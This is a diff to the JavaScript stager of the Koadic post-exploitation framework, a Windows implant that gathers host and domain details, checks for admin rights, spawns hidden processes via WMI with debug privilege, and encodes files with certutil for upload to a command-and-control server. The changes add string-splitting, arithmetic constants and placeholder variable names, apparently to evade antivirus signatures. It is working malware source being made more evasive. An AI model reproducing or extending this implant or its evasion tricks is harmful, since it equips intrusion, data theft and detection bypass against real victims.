@@ -1,7 +1,7 @@
 var Koadic = {};
 
 Koadic.FS = new ActiveXObject("Scripting.FileSystemObject");
-Koadic.WS = new ActiveXObject("WScript.Shell");
+Koadic.WS = new ActiveXObject("WScrip"+"t.Shell");
 Koadic.STAGER = "~URL~";
 Koadic.SESSIONKEY = "~SESSIONKEY~";
 Koadic.JOBKEY = "~JOBKEY~";
@@ -17,17 +17,17 @@ Koadic.EXPIRE = "~_EXPIREEPOCH_~";
  * @return void
  */
  //sleep.start
-Koadic.sleep = function(ms, callback)
+Koadic.sleep = function(#ms#, #callback#)
 {
     if (Koadic.isHTA())
     {
-        window.setTimeout(callback, ms);
+        window.setTimeout(#callback#, #ms#);
     }
     else
     {
-        var now = new Date().getTime();
-        while (new Date().getTime() < now + ms);
-        callback();
+        var #now# = new Date().getTime();
+        while (new Date().getTime() < #now# + #ms#);
+        #callback#();
     }
 }
 //sleep.end
@@ -62,7 +62,7 @@ Koadic.exit = function()
 
         try
         {
-            window.open('', '_self', '');
+            window.open('', '_se'+'l'+'f', '');
             window.close();
         }
         catch (e)
@@ -80,8 +80,8 @@ Koadic.exit = function()
 
     try
     {
-        var pid = Koadic.process.currentPID();
-        Koadic.process.kill(pid);
+        var #pid# = Koadic.process.currentPID();
+        Koadic.process.kill(#pid#);
     }
     catch (e)
     {
@@ -97,7 +97,7 @@ Koadic.exit = function()
 //isHTA.start
 Koadic.isHTA = function()
 {
-    return typeof(window) !== "undefined";
+    return typeof(window) !== "undef"+"ined";
 }
 //isHTA.end
 
@@ -109,7 +109,7 @@ Koadic.isHTA = function()
  //isWScript.start
 Koadic.isWScript = function()
 {
-    return typeof(WScript) !== "undefined";
+    return typeof(WScript) !== "un"+"defined";
 }
 //isWScript.end
 //uuid.start
@@ -117,12 +117,12 @@ Koadic.uuid = function()
 {
     try
     {
-        function s4()
+        function #s4#()
         {
             return Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
         }
-        return s4() + s4() + '-' + s4() + '-' + s4() + '-' +
-            s4() + '-' + s4() + s4() + s4();
+        return #s4#() + #s4#() + '-' + #s4#() + '-' + #s4#() + '-' +
+            #s4#() + '-' + #s4#() + #s4#() + #s4#();
     }
     catch(e)
     {
@@ -137,12 +137,11 @@ Koadic.user.isElevated = function()
 {
     try
     {
-        var res = Koadic.shell.exec("(net session || echo unelevated)", "%TEMP%\\"+Koadic.uuid()+".txt");
-        if (res.indexOf("unelevated") == -1)
-        {
+        var #res# = Koadic.shell.exec("net p"+"ause lanman"+"server", "%TE"+"MP%\\"+Koadic.uuid()+".txt");
+        if (#res#.indexOf("5") == -1)
             return true;
-        }
-        return false;
+        else
+            return false;
     }
     catch(e)
     {
@@ -159,13 +158,13 @@ Koadic.user.OS = function()
         // var colItems = wmi.ExecQuery("SELECT * FROM Win32_OperatingSystem");
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var osver = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProductName");
-        var osbuild = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\CurrentBuildNumber");
-        return osver+"***"+osbuild;
+        var #osver# = Koadic.WS.RegRead("HK"+"LM\\SOFTWARE\\Micr"+"osoft\\Windows NT\\CurrentVers"+"ion\\ProductName");
+        var #osbuild# = Koadic.WS.RegRead("H"+"KLM\\SOFTWARE\\Micros"+"oft\\Windo"+"ws NT\\CurrentVersion\\Curren"+"tBuildNumber");
+        return #osver#+"***"+#osbuild#;
     }
     catch(e){}
 
-    return "Unknown";
+    return "Unkno"+"wn";
 }
 //user.OS.end
 //user.DC.start
@@ -173,18 +172,18 @@ Koadic.user.DC = function()
 {
     try
     {
-        var DC = Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\DCName");
-        if (DC.length > 0)
+        var #DC# = Koadic.WS.RegRead("HKLM\\SOFT"+"WARE\\Microsoft\\Win"+"dows\\CurrentVersion\\Group "+"Policy\\History\\DC"+"Name");
+        if (#DC#.length > 0)
         {
             //DC += "___" + Koadic.WS.RegRead("HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\MachineDomain")
             //DC += Koadic.user.ParseDomainAdmins(Koadic.shell.exec("net group \"Domain Admins\" /domain", "%TEMP%\\das.txt"));
-            return DC;
+            return #DC#;
         }
     }
     catch(e)
     {
     }
-    return "Unknown";
+    return "Un"+"known";
 
 }
 //user.DC.end
@@ -225,12 +224,12 @@ Koadic.user.Arch = function()
 
         // var enumItems = new Enumerator(colItems);
         // var objItem = enumItems.item();
-        var arch = Koadic.WS.RegRead("HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\\PROCESSOR_ARCHITECTURE");
-        return arch;
+        var #arch# = Koadic.WS.RegRead("HK"+"LM\\SY"+"STEM\\CurrentControlSet\\Contr"+"ol\\Sessi"+"on Manager\\Environment\\PROCESSO"+"R_ARCHITECTURE");
+        return #arch#;
     }
     catch(e){}
 
-    return "Unknown";
+    return "Unk"+"nown";
 }
 //user.Arch.end
 //user.CWD.start
@@ -238,8 +237,8 @@ Koadic.user.CWD = function()
 {
     try
     {
-        var cwd = Koadic.shell.exec("cd", "%TEMP%\\cwd.txt");
-        return cwd;
+        var #cwd# = Koadic.shell.exec("c"+"d", "%TE"+"MP%\\"+Koadic.uuid()+".txt");
+        return #cwd#;
     }
     catch(e)
     {}
@@ -295,35 +294,35 @@ Koadic.user.IPAddrs = function()
 
     try
     {
-        var routeprint4 = Koadic.shell.exec("route PRINT -4", "%TEMP%\\"+Koadic.uuid()+".txt");
-        var res = routeprint4.split("\r\n");
-        for (var i=0; i < res.length; i++)
+        var #routeprint4# = Koadic.shell.exec("route PRINT", "%TEMP%\\"+Koadic.uuid()+".txt");
+        var #res# = #routeprint4#.split("\r\n");
+        for (var i=0; i < #res#.length; i++)
         {
-            line = res[i].split(" ");
+            #line# = #res#[i].split(" ");
             // count how many 0.0.0.0 entries in this array
-            zerocount = 0;
+            #zerocount# = 4-4;
             // count how many entries in this array aren't empty
-            itemcount = 0;
+            #itemcount# = 9-9;
             // flag for when this is the line we're looking for
-            correctflag = false;
-            for (var j=0; j < line.length; j++)
+            #correctflag# = false;
+            for (var j=0; j < #line#.length; j++)
             {
                 // empty string evals to false
-                if (line[j])
+                if (#line#[j])
                 {
-                    itemcount += 1;
+                    #itemcount# += 6-5;
                     // ip addr is in the 4th column
-                    if (itemcount == 4 && correctflag) {
-                        return line[j];
+                    if (#itemcount# == 2+2 && #correctflag#) {
+                        return #line#[j];
                     }
                 }
-                if (line[j] == "0.0.0.0")
+                if (#line#[j] == "0."+"0.0.0")
                 {
-                    zerocount += 1;
+                    #zerocount# += 9-8;
                     // 2 occurances of the 'any' interface in a single line is what we're looking for
-                    if (zerocount == 2)
+                    if (#zerocount# == 1+1)
                     {
-                        correctflag = true;
+                        #correctflag# = true;
                     }
                 }
             }
@@ -338,32 +337,34 @@ Koadic.user.IPAddrs = function()
 //user.info.start
 Koadic.user.info = function()
 {
-    var net = new ActiveXObject("WScript.Network");
-    var domain = "";
-    if (net.UserDomain.length != 0)
+    var #net# = new ActiveXObject("WSc"+"ript.Net"+"work");
+    var #domain# = "";
+    if (#net#.UserDomain.length != 0)
     {
-        domain = net.UserDomain;
+        #domain# = #net#.UserDomain;
     }
     else
     {
-        domain = Koadic.shell.exec("echo %userdomain%", "%TEMP%\\"+Koadic.uuid()+".txt");
-        domain = domain.split(" \r\n")[0];
+        #domain# = Koadic.shell.exec("echo %us"+"erdomain%", "%TE"+"MP%\\"+Koadic.uuid()+".txt");
+        #domain# = #domain#.split(" \r\n")[0];
     }
-    var info = domain + "\\" + net.Username;
+    var #info# = #domain# + "\\" + #net#.Username;
 
     if (Koadic.user.isElevated())
-        info += "*";
+        #info# += "*";
 
-    info += "~~~" + net.ComputerName;
-    info += "~~~" + Koadic.user.OS();
-    info += "~~~" + Koadic.user.DC();
-    info += "~~~" + Koadic.user.Arch();
-    info += "~~~" + Koadic.user.CWD();
-    info += "~~~" + Koadic.user.IPAddrs();
-    info += "~~~" + Koadic.user.encoder();
-    info += "~~~" + Koadic.user.shellchcp();
+    var #bypassio# = #net#.ComputerName;
 
-    return info;
+    #info# += "~"+"~~" + #bypassio#;
+    #info# += "~~"+"~" + Koadic.user.OS();
+    #info# += "~"+"~~" + Koadic.user.DC();
+    #info# += "~~"+"~" + Koadic.user.Arch();
+    #info# += "~"+"~~" + Koadic.user.CWD();
+    #info# += "~~"+"~" + Koadic.user.IPAddrs();
+    #info# += "~"+"~~" + Koadic.user.encoder();
+    #info# += "~~"+"~" + Koadic.user.shellchcp();
+
+    return #info#;
 }
 //user.info.end
 //user.encoder.start
@@ -495,9 +496,15 @@ Koadic.work.fork = function(jobkey, fork32Bit)
 
     cmd = cmd.replace("***K***", Koadic.work.make_url(jobkey));
     try {
-      Koadic.WMI.createProcess(cmd);
-    } catch (e) {
+    //   Koadic.WMI.createProcess(cmd);
+    // } catch (e) {
         Koadic.WS.Run(cmd, 0, false);
+    } catch (e) {
+        try {
+            Koadic.WMI.createProcess(cmd);
+        } catch (e) {
+            Koadic.exit();
+        }
     }
 }
 //work.fork.end
@@ -512,12 +519,13 @@ Koadic.http.create = function()
     {
         http = new ActiveXObject("Msxml2.ServerXMLHTTP.6.0");
         http.setTimeouts(0, 0, 0, 0);
+
         //http = new ActiveXObject("Microsoft.XMLHTTP");
     }
     catch (e)
     {
         http = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-        http.setTimeouts(30000, 30000, 30000, 0)
+        http.setTimeouts(30000, 30000, 30000, 0);
     }
 
     return http;
@@ -539,9 +547,13 @@ Koadic.http.addHeaders = function(http, headers)
     }
 
     if (!content)
+    {
         http.setRequestHeader("Content-Type", "application/octet-stream");
+    }
 
-    http.setRequestHeader("encoder", Koadic.user.encoder())
+    http.setRequestHeader("encoder", Koadic.user.encoder());
+    http.setRequestHeader("shellchcp", Koadic.user.shellchcp());
+    return;
 }
 //http.addHeaders.end
 
@@ -554,9 +566,9 @@ Koadic.http.post = function(url, data, headers)
 
     http.open("POST", url, false);
     Koadic.http.addHeaders(http, headers);
-    //alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
+    // alert("---Making request---\n" + url + '\n' + "--Data--\n" + data);
     http.send(data);
-    //alert("---Response---\n" + http.responseText)
+    // alert("---Response---\n" + http.responseText)
     return http;
 }
 //http.post.end
@@ -583,14 +595,13 @@ Koadic.http.get = function(url, headers)
  *
 **/
 //http.upload.start
-Koadic.http.upload = function(filepath, header_uuid, header_key)
+Koadic.http.upload = function(filepath, header_uuid, certutil, header_key)
 {
     var key = (typeof(header_key) !== "undefined") ? header_key : "ETag";
-
     var headers = {};
     headers[key] = header_uuid;
 
-    var data = Koadic.file.readBinary(filepath, true);
+    var data = Koadic.file.readBinary(filepath, true, certutil);
 
     if (Koadic.user.encoder() == "936")
     {
@@ -647,7 +658,7 @@ Koadic.http.bin2str = function(stream)
 
     var bin = stream.Read();
     var rs = new ActiveXObject("Adodb.RecordSet");
-    rs.Fields.Append("temp", 201, stream.Size);
+    rs.Fields.Append("temp", 101+100, stream.Size);
 
     rs.Open();
     rs.AddNew();
@@ -747,11 +758,37 @@ Koadic.process.kill = function(pid)
 Koadic.process.list = function()
 {
     var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2");
-    var query = "Select * From Win32_Process";
+    var query = "Select * Fr"+"om Win32_Process";
 
     return wmi.ExecQuery(query);
 }
 //process.list.end
+
+//process.getPID.start
+Koadic.process.getPID = function(process_name)
+{
+    var processes = Koadic.process.list();
+
+    var items = new Enumerator(processes);
+    while (!items.atEnd())
+    {
+        var proc = items.item();
+
+        try
+        {
+            if (proc.Name == process_name)
+            {
+                return proc.ProcessId;
+            }
+        } catch (e)
+        {
+        }
+        items.moveNext();
+    }
+
+    return false;
+}
+//process.getPID.end
 
 // http://apidock.com/ruby/Win32/Registry/Constants
 //registry.start
@@ -874,14 +911,24 @@ Koadic.registry.create = function(hiveKey, path, key, computer)
 Koadic.WMI = {};
 
 //WMI.createProcess.start
-Koadic.WMI.createProcess = function(cmd)
+Koadic.WMI.createProcess = function(cmd, #dpriv#)
 {
+
     var SW_HIDE = 0;
     var pid = 0;
 
-    var wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\\\.\\root\\cimv2")
+    var #dpriv# = (typeof(#dpriv#) !== "undefined") ? #dpriv# : false;
 
-    var si = wmi.Get("Win32_ProcessStartup").SpawnInstance_();
+    var #part1# = "winmgmts:{impersonationLevel=impersonate";
+    if (#dpriv#)
+    {
+        #part1# += ", (DEBUG)";
+    }
+    var #part2# = "}!\\\\.\\root\\cimv2";
+
+    var wmi = GetObject(#part1#+#part2#);
+
+    var si = wmi.Get("Win"+"32_ProcessStartup").SpawnInstance_();
     si.ShowWindow = SW_HIDE;
     si.CreateFlags = 16777216;
     si.X = si.Y = si.XSize = si.ySize = 1;
@@ -926,7 +973,7 @@ Koadic.shell.run = function(cmd, fork)
 {
     var fork = (typeof(fork) !== "undefined") ? fork : true;
     var c = "%comspec% /q /c " + cmd;
-    Koadic.WS.Run(cmd, 0, !fork);
+    Koadic.WS.Run(cmd, 5-5, !fork);
 }
 //shell.run.end
 
@@ -962,10 +1009,21 @@ Koadic.file.readText = function(path)
     {
         if (Koadic.FS.FileExists(Koadic.file.getPath(path)) && Koadic.FS.GetFile(Koadic.file.getPath(path)).Size > 0)
         {
-            var fd = Koadic.FS.OpenTextFile(Koadic.file.getPath(path), 1, false, 0);
-            var data = fd.ReadAll();
-            fd.Close();
-            return data;
+            try
+            {
+                var fd = Koadic.FS.OpenTextFile(Koadic.file.getPath(path), 1, false, 0);
+                var data = fd.ReadAll();
+                fd.Close();
+                return data;
+            }
+            catch (e)
+            {
+                // if the file is too big, certutil won't be able to write everything in time
+                // and we run into a permissions error on read. we just need it to finish writing
+                // before we can read it.
+                Koadic.shell.run("ping 127."+"0.0.1 -n 2", false);
+                continue;
+            }
         }
         else
         {
@@ -974,15 +1032,16 @@ Koadic.file.readText = function(path)
             {
                 return "";
             }
-            Koadic.shell.run("ping 127.0.0.1 -n 2", false);
+            Koadic.shell.run("ping 127."+"0.0.1 -n 2", false);
         }
     }
 }
 //file.readText.end
 //file.readBinary.start
-Koadic.file.readBinary = function(path, exists)
+Koadic.file.readBinary = function(path, exists, certutil)
 {
     var exists = (typeof(exists) !== "undefined") ? exists : false;
+    var certutil = (typeof(certutil) !== "undefined") ? certutil : false;
 
     if (!Koadic.FS.FileExists(Koadic.file.getPath(path)) && exists)
     {
@@ -998,11 +1057,10 @@ Koadic.file.readBinary = function(path, exists)
 
         if (Koadic.FS.FileExists(Koadic.file.getPath(path)) && Koadic.FS.GetFile(Koadic.file.getPath(path)).Size > 0)
         {
-            if (Koadic.user.encoder() == "936")
+            if (Koadic.user.encoder() == "936" || certutil)
             {
-                var newout = "%TEMP%\\"+Koadic.uuid()+".txt";
-                Koadic.shell.run("whoami");
-                Koadic.shell.run("certutil -encode "+Koadic.file.getPath(path)+" "+newout);
+                var newout = "%TEMP%\\"+Koadic.uuid()+".t"+"xt";
+                Koadic.shell.run("certut"+"il -encode "+Koadic.file.getPath(path)+" "+newout);
                 var data = Koadic.file.readText(newout);
                 Koadic.file.deleteFile(newout);
             }
@@ -1022,10 +1080,11 @@ Koadic.file.readBinary = function(path, exists)
             {
                 return "";
             }
-            Koadic.shell.run("ping 127.0.0.1 -n 2", false);
+            Koadic.shell.run("ping 127."+"0.0.1 -n 2", false);
         }
     }
 }
+
 //file.readBinary.end
 //file.write.start
 Koadic.file.write = function(path, data)
